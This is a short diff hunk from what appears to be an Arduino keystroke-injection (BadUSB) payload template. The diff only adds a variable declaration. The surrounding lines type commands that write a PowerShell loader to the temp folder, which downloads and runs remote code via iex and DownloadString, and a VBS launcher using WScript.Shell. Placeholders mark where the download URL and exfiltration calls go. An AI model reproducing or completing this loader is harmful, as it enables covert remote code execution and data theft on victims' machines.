@@ -24,6 +24,7 @@ void setup(){
   Keyboard.println("echo $pv = iex $wc.DownloadString(\"INPUT4\") >> %temp%\\dl.ps1");
 
   String fn = "dl";
+  String fp;
   EXFILCALLS
 
   Keyboard.println("echo Set oShell = CreateObject(\"WScript.Shell\") > %temp%\\dl.vbs");
